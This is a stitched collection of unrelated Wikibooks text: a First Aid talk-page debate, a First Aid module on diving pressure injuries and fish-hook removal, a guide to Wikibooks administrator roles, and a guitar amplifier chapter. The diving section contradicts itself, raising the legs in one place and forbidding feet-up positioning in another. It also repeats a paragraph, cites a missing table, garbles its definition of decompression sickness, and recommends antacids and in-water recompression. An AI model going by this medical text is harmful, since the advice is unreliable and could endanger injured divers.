:'''&amp;ndash; [[User:Mike.lifeguard|Mike.lifeguard]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|talk]]&lt;/sup&gt; 21:23, 5 July 2007 (UTC)

::I think that AED is now so firmly routed in BLS (it's part of most basic courses over here now) that it should be part of the basic protocols, rather than deadly bleeding.  I'd even go so far as to move the AED operation up to BLS section.  I'm not sure its responsible to bring deadly bleeding in to the BLS protocol for first aiders lest they neglect the important parts.  In terms of EMS treatment, we are going to resus and defib first then look for the Hs and Ts (which includes 'deadly bleeding' as Hypovolaemia).  Thinking about that, deadly bleeding is only one of 15 reversible causes of cardiac arrest, and in honesty probably the one with the lowest chance of survival (trauma related cardiac arrest ROSC rates are a tiny fraction of 1%, far lower than the other causes)  It seems strange to give it such prominence when its unlikely to help. [[User:Owain.davies|Owain.davies]] 06:13, 6 July 2007 (UTC)

:::It's more likely to help than nothing, which is what you're proposing. Someone trained in CPR but not AED (which, unfortunately, is more likely than having both) should be doing defib? No! If they're not trained to use an AED then they're not going to be using an AED! So what would have them do? Nothing seems like a bad idea, and this sounds at least marginally better.
:::For rescuers with AED training on top of their CPR, they'll obtain an AED in '''A'''mbulance (again, this section doesn't exist because my [[Talk:First Aid#Proposal|proposal]] hasn't been adopted) and then use it (the operation of defib is an advanced topic, and is located there).
:::Feel free to make it clearer that defib takes priority, but putting a skill ''requiring additional training'' with a skill that ''doesn't'' is not ok.

::::I can agree with Mike here, only rescuers trained in using an AED should use one. I did make the point about it being easy, but the stresses of using an AED to shock someone may be too much for someone who isn't trained in it. --[[User:Nugger|Nugger]] 00:30, 16 July 2007 (UTC)

== Ambulance before Airway - Disagree ==

You shouldn't call an ambulance before checking airway and breathing as the call may be incorrectly categorised at the control centre.

The correct procedure is:

*Check response
*If Unresponsive then ''call'' for help (&quot;Help! Help!&quot;)
*Check Airway
*Check Breathing
*NOW summon ambulance (&quot;patient not breathing&quot;)

This avoids calls being passed as 'Unconscious' when it should be passed as &quot;Not Breathing&quot; and ensures that the most timely resposne it recieved.  It is best practice to give the 15 seconds maximum to ascertain this important fact, which avoids a potentially more deadly delay of having a call misgraded.

We should stick to this protocol at all times, to avoid the risk of badly passed calls

Fair enough, i'll give you that one.  As to victim, you probably can be a victim of a heart attack, but still not of a cut finger!... [[User:Owain.davies|Owain.davies]] 16:02, 5 July 2007 (UTC)

:I'm fine to alternate between victim and patient just as the 3 organizations above do... victim for most stuff, and patient/casualty in [[First Aid/Advanced Topics]]. Using patient for ''everything'' is not ok though. '''&amp;ndash; [[User:Mike.lifeguard|Mike.lifeguard]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|talk]]&lt;/sup&gt; 20:30, 5 July 2007 (UTC)

Using alpha-echo, a delta unconscious is lights and sirens just like an echo cardiac arrest is.  Only thing different is that you might run to the truck for an echo and drive a wee bit faster for a cardiac arrest.  Once the dispatcher beings collecting the information, she can always advise EMS to upgrade to a cardiac/respiratory arrest. [[User:Mike6271|Mike6271]] 02:54, 6 July 2007 (UTC)

:::I've found it! - The ILCOR protocol is NOT to call for EMS until you have assessed breathing, although you should shout for help when you see they are unconscious - which is what i said originally.  I will consequently change this information around.  This is shown at [http://circ.ahajournals.org/cgi/content/full/112/22_suppl/III-1 Part I: Introduction] of the ILCOR protocol, under &quot;The Universal Algorithm&quot;.

::::What if they ''are'' breathing... Do they still require EMS? Yes. So?

:::::Allow me to throw another wrench in here, but don't forget about children and infants when you do make the change as they require immediate assistance if you're alone. (I know it's stated somewhere but just a friendly reminder.) --[[User:Nugger|Nugger]] 00:21, 16 July 2007 (UTC)

::::::Mike- you can't be so sanctimonious about following ILCOR protocols throughout, and then just ignore one the most fundamental parts, just because it doesn't suit your preferred protocol!  The link I posted above from ILCOR unambiguously states that calling the ambulance comes after airway and breathing - we either follow it all (and i'm happy to relent on the breathing issue because that is their guideline) or we follow none of it, and turn this in to a bun fight over regional variations.  I say we follow the ILCOR guidelines to the letter, which will make this book unambiguous and clear. (this will also mean changing things like D for defibrillation, which ILCOR list as a BLS skill.  [[User:Owain.davies|Owain.davies]] 17:05, 16 July 2007 (UTC)

:::::::I'll have to agree with Owain on this one, although Mike posted a link from the AHA which stated &quot;An Immediate call to 9-1-1&quot; it didn't specify WHO had to call 9-1-1. ILCOR states that YOU should &quot;shout for help&quot; then assess breathing. A patient who is dead from a blocked airway won't appreciate your immediate 9-1-1 call. But a person who may be able to breathe from a simple head tilt will thank you later. 9-1-1 can be called by ANYONE, it doesn't have to be the rescuer.--[[User:Nugger|Nugger]] 03:24, 5 August 2007 (UTC)

== AVPU or ALVPU ==

I know that [[User:Owain.davies|Owain.davies]] (who is mostly responsible for writing this module) only uses a four-point scale for assessing consciousness, but I use a 5-point scale. The module as it currently stands explains why I use an additional level of consciousness: Lowered.

Under &quot;Alert&quot; it says &quot;The victim looks at you spontaneously, can communicate (even if it doesn't make sense) and seems to have control of their body.&quot; In the 5-point scale, Alert is for victims who make coherent sentences, can communicate effectively and have no issues with responsiveness. Lowered covers those victims who take longer to respond, have heavy eyelids because they feel tired, they may have shaky hands due to shock or an &quot;adrenaline rush.&quot;

I think the 5-point scale is more accurate than the 4-point, particularly because the grey area referred to [[First Aid/Consent#Implied consent|here]] deals with those people who fall into the Lowered category. I find that tying those 2 concepts together helps candidates make better judgment calls when dealing with issues of implied consent that aren't straightforward.

Keep 4 levels or introduce the 5th? ''' &amp;ndash; [[User:Mike.lifeguard|&lt;font color=&quot;Indigo&quot;&gt;Mike.lifeguard&lt;/font&gt;]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|&lt;font color=&quot;Indigo&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 02:00, 16 July 2007 (UTC)

:This is a primary assessment, and LOC comes later.  AVPU is also recognised worldwide, with numberous published papers i can give you links to (or just google it if you feel like it), whereas ALVPU seems to be a variation.  I can see why you use it, but i don't think its relevant here. [[User:Owain.davies|Owain.davies]] 16:58, 16 July 2007 (UTC)

::AVPU is the international scale for responsiveness. Descriptions of how alert a person is are given later in the reports.--[[User:Nugger|Nugger]] 03:26, 5 August 2007 (UTC)

== AAA vs GO DR SHAVPU ==

I don't see how you AAA system is an improvement on the GO DR SHAVPU system I laid down for initial assessments.  Whilst your system does have an alliterative advantage in initial memory making, it is actually harder because it relies on the rescuer remembering a whole sub-set of parts which make up the As, whereas the GO DR SHAVPU system is far more comprehensive.  Also, as I said the ILCOR guidelines state that ambulance comes after airway and breathing - read your own posted link!!!! [[User:Owain.davies|Owain.davies]] 17:01, 16 July 2007 (UTC)

:Please don't yell at me. I've copied the relevant text; feel free to change the module to match this:

{{TextBox|
For the unresponsive adult, the lay rescuer sequence of action is as follows:

* The lone rescuer should telephone the emergency response system and retrieve an AED (if available). The rescuer should then return to the victim to begin CPR and use the AED when appropriate.
* The lay rescuer should open the airway and check for normal breathing. If no normal breathing is detected, the rescuer should give 2 rescue breaths.
* Immediately after delivery of the rescue breaths, the rescuer should begin cycles of 30 chest compressions and 2 ventilations and use an AED as soon as it is available.

For the unresponsive infant or child, the lay rescuer sequence for action is as follows:

* The rescuer will open the airway and check for breathing; if no breathing is detected, the rescuer should give 2 breaths that make the chest rise.
* The rescuer should provide 5 cycles (a cycle is 30 compressions and 2 breaths) of CPR (about 2 minutes) before leaving the pediatric victim to phone 911 and get an AED for the child if available. The reasons for immediate provision of CPR are that asphyxial arrest (including primary respiratory arrest) is more common than sudden cardiac arrest in children, and the child is more likely to respond to, or benefit from, the initial CPR.

:Yes your memory aid is comprehensive, but I can't see teaching any kid to remember that successfully. AAAABC works very well for me. If you'd like to include both, let's remove memory aids from the text proper, and include them in a textbox for memory aids. I can create another template similar to [[First Aid/Templates|these]] for memory aids. I think if we do that throughout the text it might alleviate a lot of the bickering.

::Of course, this book is not 'First aid for kids'.  First aid for kids is something I only teach occasionally, and you're right, i wouldn't do GO Dr SHAVPU with them, and it that case i would emphasise calling EMS more highly, because they are likely to be more efficient doing that than attempting to treat, but most competent adult rescuers can understand and remember the GO DR.  Maybe a separate 'First aid for kids' book is not a bad idea though.  As per my other discussion with you, i have reread the ILCOR document in detail, and still believe that ambulance comes after airway and breathing. [[User:Owain.davies|Owain.davies]] 06:42, 17 July 2007 (UTC)

:::My point is that this textbook should be useful for any first aid or CPR course, and the advanced topics chapter should be useful for the appropriate courses. First aid doesn't have an age prerequisite, so why shouldn't a 12-year old take standard first aid? I do community CPR courses all the time, and I suspect that even adults are going to prefer AAAABC because they'll be able to remember it.
:::I think using AAA as an organizational method for the text of this module and highlighting GO DR SHAVPU in a box to the side would be most effective though. AAA creates a very nice section hierarchy that your mnemonic doesn't. And (according to you, though I don't agree), GO DR SHAVPU is a wonderful memory aid that your candidates will remember forever, so let's give it a box to the side to give it more prominence.

      <text xml:space="preserve">{{ FirstAidHeader}}
==Pressure-Related Illness &amp; Injury==
Divers and swimmers alike must avoid injuries caused by changes in air pressure. The weight of the water column above the diver causes an increase in air pressure in any compressible material (wetsuit, lungs, sinus) in proportion to depth, in the same way that atmospheric air causes a pressure of 14.7 lbs per square inch at sea level. These pressure injuries &amp; illnesses are most common in divers, but some can affect skin divers (snorkelers) or swimmers.

===Treatment===
*Call EMS
*Monitor ABCs and vitals
*Raise the victim's legs and feet if possible
::If there are bubbles present in the bloodstream, this will help keep them from the internal organs. Bubbles tend to travel up - away from the brain (preventing [[First Aid/Stroke &amp; TIA|stroke]]) and heart (preventing [[First Aid/Heart Attack &amp; Angina|heart attack]]).
*Recompression may be required; tell EMS that the situation involves a pressure-related injury or illness
*If you are trained in oxygen administration and have the appropriate equipment, administer high-flow O&lt;sub&gt;2&lt;/sub&gt;

==Decompression Sickness (the Bends)==
As divers ascend, the pressure the water column exerts on them decreases, which decreases the solubility of gasses. Those gases will no longer stay dissolved in the bloodstream, and escape at a maximum rate. If the ascent is faster than the rate that the gases can escape from the bloodstream is, then the gases form bubbles. The location of these bubbles determines what type of decompression sickness develops; if the bubbles form in the lungs, then [[#Air Embolism|air embolism]] develops.

===Recognition===
Bubbles can form anywhere in the body, but symptomatic sensation is most frequently observed in the shoulders, elbows, knees, and ankles.

This table gives symptoms for the different DCS types.
*The &quot;bends&quot; (joint pain) accounts for about 60 to 70 percent of all altitude DCS cases, with the shoulder being the most common site. These types are classified medically as DCS I.
*Neurological symptoms are present in 10 to 15 percent of all DCS cases with headache and visual disturbances the most common. DCS cases with neurological symptoms are generally classified as DCS II.
*The &quot;chokes&quot; are rare and occur in less than two-percent of all DCS cases.
*Skin manifestations are present in about 10 to 15 percent of all DCS cases.

==Oxygen Toxicity==
Oxygen toxicity occurs when oxygen in the body exceeds a safe level.
===Recognition===
*Dizziness
*Nausea and twitching, especially on the face
*Seizures
*Unconscioussness

==Air Embolism==
As divers ascend, the pressure the water column exerts on them decreases, which decreases the solubility of gasses. Those gases will no longer stay dissolved in the bloodstream, and escape at a maximum rate. If the ascent is faster than the rate that the gases can escape from the bloodstream is, then the gases form bubbles. The location of these bubbles determines what type of decompression sickness develops; if the bubbles form in the lungs, then [[#Air Embolism|air embolism]] develops.

Air embolism can also develop when a diver receives pressure damage to their lungs following a rapid ascent where the breath is inappropriately held against a closed glottis, allowing pressure to build up inside the lungs, relative to the blood. The gas bubbles can impede the flow of oxygen-rich blood to the brain and vital organs. They can also cause clots to form in blood vessels.

Gas embolism and decompression sickness (DCS) may be difficult to distinguish, as they may have similar symptoms, especially in the central nervous system. The treatment for both is the same, because they are both the result of gas bubbles in the body.

==Shallow-Water Blackout==

[[Image:Shallow water blackout diagram 1 revised.svg|thumb|left|A normal breath-hold dive, with blood oxygen (O&lt;sub&gt;2&lt;/sub&gt;) and carbon dioxide (CO&lt;sub&gt;2&lt;/sub&gt;) levels plotted against time.]]
[[Image:Shallow water blackout diagram 2 revised.svg|thumb|right|A dive in which the diver hyperventilates before diving, causing hypocapnia (low levels of blood CO&lt;sub&gt;2&lt;/sub&gt;), and succumbs to shallow water blackout.]]

Shallow water blackout is loss of consciousness caused by lack of oxygen in the blood towards the end of a breath-hold dive in shallow water, when the swimmer does not necessarily experience an urgent need to breathe and has no other obvious medical condition that might have caused it.

The urge to breathe (more precisely: to exhale) is triggered by rising carbon dioxide (CO&lt;sub&gt;2&lt;/sub&gt;) levels in the bloodstream.  Hyperventilation artificially depletes these, causing a low blood carbon dioxide condition called hypocapnia. Hypocapnia reduces the reflexive respiratory drive, allows the delay of breathing and leaves the diver susceptible to loss of consciousness from hypoxia.

==Decompression sickness==
Decompression sickness (DCS), also known as the bends or diver's sickness is a severe medical condition where arterial gas fails to repressurize properly, forming bubbles in the blood vessels. While commonly associated with surfacing too rapidly while diving, it can occur in any rapid change from a high pressure to a low pressure environment. If not treated promptly, decompression sickness is fatal.  
===Treatment===
Multiple treatments are used for DCS. The moment DCS is suspected, emergency medical assistance should be summoned. The success and survival rates for treatments drop as time goes on. Remove the patient from the water, but do not use the Trendelenberg position (supine, feet above head). Administer antacids to the patient and oxygen if available. Follow any further instructions from medical personnel to the letter. When emergency personnel arrive, it is important that all dive gear are transported with the patient as they may indicate the reason for DCS, and consequently the appropriate treatment. 

DCS treatment consists of provision of oxygen and recompression to remedy the gas imbalance. When medical care is not available, use of oxygen may clear up mild to moderate cases of DCS. Even if symptoms disappear, the patient still requires medical attention at the earliest opportunity because lack of symptoms does not indicate that the situation is resolved. In an aquatic environment where the patient will not reach medical care in time, recompression can be achieved as a last resort though reentry into the water. Where there is another option, this treatment is always discouraged to the extreme risk involved. Suit the patient and another diver up and have them enter the water. Whenever possible, follow a recompression table. If none is available, proceed to the depth where the patient left the dive table and continue to follow the table. There are no second chances, because failure to adhere to the table as written most likely will kill or cause permanent damage to the patient and may cause DCS in the caregiver.

==Fish hooks==
===Assessment and Treatment===
[[Image:Barb (PSF).jpg|thumb|The barb of a fish hook ensures the hook does not come out - you may have to push the barb all the way through the fleshy fingertip to remove the hook.]]
Many a fisherman has felt the pain associated with stabbing an extremity with a fish hook. Thankfully, these wounds are generally not dangerous when properly treated. In all cases, proper treatment is crucial due to the potential side effects of the unclean metal. 

Before attempting to remove the fish hook, assess if removal in the field will cause any side effects. For example, '''never''' attempt to remove an object in the eye or near a major artery. When in doubt, it is wise to err on the side of caution and transport to an urgent care unit or emergency department. Once satisfied that removal can be done in the field, assess how deep the hook has gone in. It is generally advisable to have another person remove the hook whenever possible. Where the barb has not fully penetrated the skin, gently but firmly pull the hook out. If the barb is buried in the skin, attempting to remove the hook this way will only create a bigger hole, cause more pain to the patient, and potentially lead to unpleasant side effects. In these cases, the barb must be eliminated before the hook can be removed. The most commonly used method is to carefully loop the hook around and push it back through the skin. Once the barb is visible, use wire cutters or another sharp instrument to separate the barb from the hook. (If the hook was barbless to begin with, simply back the hook out through the entry hole.) Then back the barbless hook out through the original hole. Thoroughly clean all wounds and remove any and all remnants. Apply an antibiotic ointment and apply a sterile dressing. Wrap the bandage firmly but do not cut off circulation.

===Post treatment care===
The risk of tetanus may necessitate a booster immunization. Due to the fatality rate of tetanus, it is strongly advisable that victims receive the immunization if needed. The wound site should be monitored for signs of infection. If signs appear or the wound does not appear to be healing normally, seek medical attention as soon as possible.

== Administrators ==

Administrators are regular Wikibookians, who started off as ordinary readers, editors, and writers. However, over time these users have gained experience in helping the project beyond their own books and they've also gained the trust of the community. When a user has been active for a long time, expressed an interested in helping the project, and has gained the trust and respect of the community, they can be nominated for additional tools at [[WB:RFP|Requests for Permissions]]. 

The community will discuss the nomination, and if people generally agree, that user will be promoted with the necessary permissions. There are many different types of permissions available for different uses, including '''importer''', '''reviewer''', '''uploader''', '''administrator''', '''bureaucrat''', and '''CheckUser'''.

The list of all current administrators can be found in the special [[Special:ListUsers/sysop|ListUsers page]].

=== Administrator Tools ===

Administrators are just regular Wikibooks users, they are not special nor superior to any user in any way. The only difference is that they have access to certain tools which have been found to be potentially disruptive and therefore are not available to all new users by default. Using these tools requires a certain amount of trust from the community, and usually some sort of knowledge of the related [[WB:PAG|policies and guidelines]] concerning them. Some of these tools are:

;Deleting and Undeleting: Only an administrator can delete a page, and only an administrator can view and restore deleted pages. Deleting pages can be very disruptive and can be hurtful to the author's feelings, so it is not to be done in haste.
;Blocking Users: Some users just cause trouble, and an administrator can block these users from editing. This is used as a preventative measure, to help prevent vandals from destroying the hard work of our editors and writers.
;Importing Pages: Adminstrators and importers have a special tool for [[m:Help:Import|importing]] pages from other Wiki projects, such as Wikipedia. Importing preserves the edit history of the page, which is a necessary criteria of the [[WB:GFDL|GFDL]] license.
;Rollback: This tool allows administrators and [[Help:Revision review|reviewers]] to quickly undo vandalism.
;Protecting and Unprotecting:Page protection is used sparingly at Wikibooks. Admins can use a variety of page protection options to restrict who can edit, move or create a certain page or set of pages in response to an edit war or vandalism.
;Reviewing: Admins and [[Help:Revision review|reviewers]] can mark pages as reviewed, to help spread out the task of checking pages for problems as they are created.

== Bureaucrats ==
Administrators who have been members at Wikibooks for a long time, and have been both active and held in high regard can be nominated for bureaucratship at [[WB:RFP|Requests for Permissions]]. If the community agrees, that user can be promoted to bureaucrat. Bureaucrat nominations are more important than administrator nominations, and they are only agreed to with extreme caution.

Bureaucrats, in addition to the tools of ordinary administrators, have the ability to rename users, to promote new administrators, and to set and unset the [[WB:BOT|bot]] flag. These abilities can potentially be very disruptive to the community if used improperly, and so only well-trusted users are given these tools.

The list of current bureaucrats is found at the special [[Special:ListUsers/bureaucrat|ListUsers page]].

== CheckUsers ==
By registering an account, you protect sensitive information about yourself, such as your IP address, from being displayed publicly. However, CheckUsers have special tools for examining your IP address and other information about your internet connection. A CheckUser only checks this information when there is a problem with sockpuppetry or vandalism. In addition to local policy, CheckUsers are also bound by the Wikimedia privacy policy. Abusing the tool and revealing private information about the users here could lead to serious consequences for the CheckUser, both on and off the wiki. CheckUsers often participate in issues which affect many wikis, because things like multi-user vandalism attacks are typically spread out on multiple projects.

When an administrator has demonstrated skill and perseverance in fighting vandalism, they can be nominated for CheckUser at [[WB:RFP|Requests for Permissions]]. Because of the legal ramifications of being able to see protected information about users, CheckUsers must be very trusted, and they must also identify themselves to the [[m:WMF|WMF]] as being above the age of majority. In the United States, Canada, and the United Kingdom, the age of majority is 18.

Because of [[m:CheckUser policy|WMF policy]], a CheckUser nomination is not a regular discussion, but is instead a vote. A CheckUser must receive 25-30 supporting votes with at least 70-80% support in order to be promoted. This requirement is non-negotiable, and if it is not met the stewards at Meta will not perform the promotion.

Current CheckUsers are listed at the special [[Special:ListUsers/checkuser|ListUsers page]].

== Admins as Leaders ==
Admins and bureaucrats don't have any additional authority by virtue of their extra permissions, but many of them do tend to take informal leadership roles in community discussions. Admins typically have been users for a long time and have usually accrued a large amount of experience and knowledge about the workings of the project. This is especially true of experience in performing administrative duties. If they were not knowledgeable, helpful, and experienced, these users would not have been promoted to admins in the first place. Also, users who demonstrate these qualities typically are nominated by their peers to become admins.

Admins may often feel that they are &quot;required&quot; to act in a leadership role, and they may also find that other users look up to them for help and guidance. Users should be prepared for this additional pressure and responsibility before they accept any adminship nomination.

=== Understanding The Community ===
The Wikibooks community is large and diverse, but at the same time it is relatively small compared to Wikipedia. It is important to remember that many Wikibookians are not available every day, and that many Wikibookians take short breaks, or even entire seasons off from volunteering here. For this reason, it is important that discussions which require community input, such as [[WB:RFP]] or [[WB:RFD]], be allowed to continue for at least a week or two. More important decisions, such as discussions about altering site policy, should be allowed to remain open for much longer, to ensure sufficient community involvement. There are no hard and fast rules about the minimum lengths of time required, so the judgement of the community members is relied upon to keep things flowing smoothly. Questions where the answer is obvious and unequivocal do not need to be kept open for very long at all. Complex and multifaceted discussions need more user input and therefore should remain open for longer. When it comes to important discussions, more viewpoints helps to create a more comprehensive and viable resolution.

Wikibookians are also volunteers and there is nothing that a volunteer &quot;must&quot; do. Wikibookians, including admins, are not ''required'' to do anything that they do not want to do: Editors cannot be forced to make edits they do not want to make, admins cannot be forced to take admin actions that they do not agree with, etc. It is important to treat all Wikibookians with the proper respect, and to treat them like valuable assets and not slaves or servants.

== Norms and Guidelines ==
A general norm at Wikibooks is that only people with the power to enact a decision can actually make that decision. For example, only an admin can choose to delete a page. Only a bureaucrat can choose to promote a new admin, or rename a user. Only a CheckUser can choose to perform a check on a user. Nobody can be &quot;forced&quot; to do anything that they don't want to do, regardless of what the rest of the community wants. 

When we start to talk about many of the admin functions in the next few pages, we will be using many phrases such as &quot;...at the discretion of an admin&quot;, or &quot;If an admin chooses...&quot;. These aren't rules, and they aren't even really suggestions. Admins, like all other Wikibooks users, are encouraged to use their best judgment when making decisions, and best judgment cannot be forced nor scripted.

== Becoming an Admin ==
=== Nominations ===
Potential admins can be nominated at [[WB:RFP]]. That nomination can also be a self-nomination (a &quot;request&quot;) if the user is so inclined. If it was not a self-nomination, the candidate must accept or refuse the nomination before any action can be taken. When you nominate a person for a new permission, it's polite to send them a notice to let them know about it and ask for their acceptance.

=== Discussion ===
In an RFP discussion Wikibookians will tend to give an approve/disapprove position, typically using the {{support}} and {{oppose}} signs. Some Wikibookians will cast bare votes like this, others will write thoughtful comments explaining their opinions on the matter. Different admins and bureaucrats have different styles when it comes to interpreting community consensus and determining a resolution. It's rarely the case that these discussions are decided by a simple raw vote tally, but it's not wrong if the vote count is used as a factor in making the decision. Admins and Bureaucrats will each like to see different levels of community participation, different thresholds of supporting versus opposing votes/comments, and maybe even other additional factors.

While it's not always encouraged, Administrators and Bureaucrats are empowered to make decisions for the good of the project, even if those decisions actually contradict community opinion.  A good and wise administrator will realize that vigilantism like this is not usually a good thing, because it disregards the opinions of so many good wikibookians and because it can upset so many people.

== De-Adminship ==
An existing admin can be nominated for de-adminship (&quot;deadminship&quot;) for a variety of reasons. Nominating an admin for deadminship when that admin doesn't deserve it for some reason can be considered a very uncivil and unkind act, so be prepared to argue the case if you make such a nomination. Some reasons for nominating an admin for de-adminship (or bureaucrat for de-bureaucratship, etc) are as follows:

#Clear misuse of given tools
#Clear abuse of community trust, or wanton disregard for [[WB:PAG|policy]].
#Clear inactivity for a long time
#Abusive or disruptive behavior, harassment, personal insults, or any other kind of negative behavior

The vetting and discussion processes for new admins are typically not prone to much abuse, and so the people who get promoted tend to be level-headed and trustworthy. It's also worth noting that all people make mistakes, and adminship will not be revoked for every misstep and every mistake.</text>

Its always a good idea to visit many dealers including pro-audio outlets to test amplifiers across the entire price range before committing yourself. This chapter will explain the difference between a tube amplifier and a solid state amplifier as well as exploring the variations on these two basic designs.

== Tube, Solid State and Hybrid Amplifiers ==

=== Tube ===
Tube amplifiers produce a warm and fat tone that is popular with guitarists. New models are available from Marshall, Fender and Vox as well as other manufacturers many of whom have an equal reputation for quality. Vintage tube amplifiers are available to buy though maintaining them can be more expensive especially with regards to the cost of replacement parts. The continuing popularity of vintage amplifiers from earlier decades, like The Fender Bassman, Epiphone Valve Junior and the Marshall JMP100, has resulted in a market for reissues. 

[[File:MarkIV-2.jpg|thumb|left|Mesa Boogie Mark IV Combo tube amplifier]]

There are three operating modes for tube technology: Class A, Class B and Class AB.

*Pure Class A operates by having a full continuous current flowing through the tubes. The tubes are still fully powered even when there is no signal to divert to the speaker. This makes Pure Class A tubes expensive to run; similar to a car idling in neutral with the throttle pedal right down. Pure Class A responds very fast to an input signal with a tube saturation (distortion) that many guitarists find appealing. Many Pure Class A amplifiers use tubes with a low wattage to offset their inefficient operating mode thereby increasing the tubes lifespan and reducing running costs. Examples of Pure Class A amplifiers are the Epiphone Valve Junior and Fender Champion 600.

*Class A refers to an output design that doesn't use the Pure Class A single-ended output stage. Class A uses a pair of tubes or multiples terminating in a push-pull output stage.  

*Class B is rarely used in guitar amplifiers due to crossover distortion issues so manufacturers instead use a combination of Class A and Class B known as Class AB.
  
*Class AB operates by using a pair of tubes. Pure Class A produces the entire waveform using just one valve, positive and negative, with a single ended output. Class AB uses two valves with one handling the positive voltage and the other the negative voltage to produce the entire waveform. Pure Class A, which uses a full continuous current to achieve a 360 degree waveform, is in essence always on at full power even when no signal is present. The Class AB design uses a smaller amount of constant current to achieve the same always on state for the two valves. Class AB is thereby more efficient with regards to power consumption and heat dissipation which also means that the operating life of the tubes are greatly extended. The Vox AC-30 is a popular amplifier that uses Class AB.

Tube amplifiers:

* A tube is based on vacuum technology and requires more energy than a solid state amplifier with the same wattage. 
* Vacuum tubes are expensive and require replacement every one to four years depending on use. 
* Amplifiers with tubes are generally heavier than solid state amplifiers due to the need for an output transformer. 
* Tube amplifiers are usually more expensive than a solid state amplifier. 
* Tubes require a warm-up period before they reach optimum performance.

===Solid State===
[[File:JC-120UT.jpg|thumb|Roland Jazz Chorus JC-120 solid state amplifier]]

Solid state amplifiers are very popular with beginners due to their affordability. Solid state amplifiers have a fast attack time and are immediately available for use when switched on. The Jazz-King and Steel-King models by Fender and the Polytone Mini-Brute are examples of solid state amplifiers.

Solid state circuitry allows more volume to be applied to the output signal before clipping occurs which makes the amplifiers suitable for jazz or acoustic guitarists who may wish to retain a clean sound at high volumes. A solid state amplifier matched with good quality speakers can produce a wide frequency response; the importance of which is not lost on any guitarist who has upgraded their headphones and rediscovered the bass and hi hats of their favorite songs. Some solid state amplifiers use field effect transistors (FET) on the preamp stage which at high gain produces a distortion similar to a tube amplifier. 

Solid state amplifiers retain a tight low end while producing a full harmonic distortion at high gain which is desirable for the metal genre. This has resulted in a range of solid state amplifiers specifically designed for metal guitarists like the Randall Warhead and Fender MetalHead. Solid state amplifiers tend to be smaller, lighter and cheaper than their equivalent tube amplifiers and these design factors has allowed solid state amplifier manufacturers to build amplifiers weighing less than 10lbs which are capable of 150w clean RMS (Root Mean Square refers to continuous output as opposed to Peak measurement which is the wattage of an amplifier measured in a short burst) sound. Notable examples include the Crate CPB150, the Fender Ultralight Series and the ZT Lunchbox.

Solid State amplifiers:

* A solid state amplifier requires less energy to power than an equivalent tube amplifier. 
* Solid state circuitry needs minimum maintenance and there are no tubes to replace.  
* Solid state amplifiers are more robust than tube amplifiers. 
* Solid state amplifiers are available in an affordable price range. 
* A solid state amplifier requires no warm-up.

===Hybrid===
All amplifiers have a preamp stage which boosts the signal from the guitar before it is sent to the power amplifier stage. Hybrid amplifiers are designed to utilize both tube and solid state technology and are available in the following configurations:

*tube preamp coupled with a solid state power amplifier
*solid state preamp coupled with a tube power amplifier

A tube preamp coupled with a solid state power amplifier outputs a tube tone with a fast attack. A solid state preamp coupled with a tube output provides solid state high gain with the warmth of tubes. The Music Man range of amplifiers, the company now only market their guitar and bass range, have a solid state preamp with a tube output and many professional guitarists have favored these amplifiers for their reliability and tone.  

Design variations may include digital modeling, integrated tube/solid state stages or further additional tube or solid state stages in the signal path:
*the Vox Valvetronix signal path starts with solid state effects and preamp which sends the signal to a tube/solid state integrated output stage
*the Line 6 Spider Valve signal path starts with digital tone processing followed by a tube preamp which sends the signal to a tube power amplifier

==Typical features of an amplifier==
===Standard===
*Input - accepts a quarter inch mono jack cable  
*Power - off and on
*Volume - adjusts the volume
*Speaker - built-in or separate cabinet

===Additional===
*Gain - the amount of boost applied at the preamp stage
*Tone/Equalizer - treble and bass tone knobs or graphic equalizer
*Headphone socket - headphones can be used for private practice
*Channel selection - switch between clean and high gain

===Extra===
*Additional inputs - high sensitivity input for use with a low-output pickup and low sensitivity input for use with a high-output pickup   
*Modeling - digital emulations of popular amplifiers and effects
*Onboard effects - built in proprietary effects such as chorus, delay and echo   
*Effect loop - external effects can be plugged into the amplifier  
*Line in - the audio signal bypasses the preamp stage and is sent directly to the power amplifier 
*Line out - the output from the amplifier can be sent to another power amplifier or mixing desk
*Speaker out - standard on a separate amplifier and when found on a combo amplifier allows a different speaker to be used
*Foot-switch plug - an external foot-switch can be plugged in 
*Impedance switch (on tube amplifiers only) - change the resistance, measured in ohms, of the amplifier to match speaker impedance  
*Standby switch (on tube amplifiers only) - the standby switch has exactly the same function as the standby mode of a computer which removes the need to cold boot when taking a short break. Any technology that requires a time period to reach optimum working state benefits from this idea. Components are powered down while remaining in a ready state which saves energy and extends the operating life of components.

==Size==
A Marshall head and full-size cabinet are bulky and heavy items to transport. A full-sized Marshall cabinet has two handles, one on either side, and requires two people to lift and move it safely. In the early stages most bands transport and setup their own equipment. Storage and transportation must be considered when buying a large guitar rig.

Combo amplifiers are favored by many guitarists because of their compact form and matched amplifier and speakers. The Vox AC30 and Fender Twin are examples of combo amplifiers. Small practice amplifiers such as the Vox DA5 or Epiphone Valve Junior are suitable for home use and are easily transported and stored.

==Speakers and wattage==
Doubling the wattage or speakers will result in a volume increase of approximately 3db. Multiplying the wattage by ten (10 watts --&gt; 100 watts) will result in a volume increase of approximately 10db effectively doubling the volume.  Note that 25 watts into a 4x12&amp;quot; cab will be as loud as 100 watts into a 1x12&amp;quot; cab. A full stack consisting of a 100 watt amplifier and two cabinets of 4x12&amp;quot; speakers is equivalent to 800 watts. 

===Speakers===
A combo amplifier or speaker cabinet will have either a single speaker or multiples. Most two speaker amplifiers, ranging from the smallest 50 watt combo amplifiers to the MG15MSII Microstack offered by Marshall, have basically the same amplification circuit as their single-speaker counterparts. A two speaker configuration may have a smaller diameter than their single speaker counterpart e.g. 2x10&amp;quot; instead of 1x12&amp;quot;.

The main benefit of having multiple speakers is that it increases volume as well as bass response without sacrificing the higher frequencies. By having more speaker cones the speakers will move more air. For example, a 2x10&amp;quot; will have a surface area of 157 sq.in. while a 1x12&amp;quot; will have a surface area of 113 sq.in. A 4x10&amp;quot; cab is often used for large combo amplifiers as it provides most of the bass response you'd get from a 1x15&amp;quot;, but retains the high frequency that the 1x15&amp;quot; can't produce. Also, it will have increased power-handling capability, or more precisely, they split the amplifier output. Thus, given same amplification head, a two speaker configuration will have louder volume, but only half the power to each speaker. 

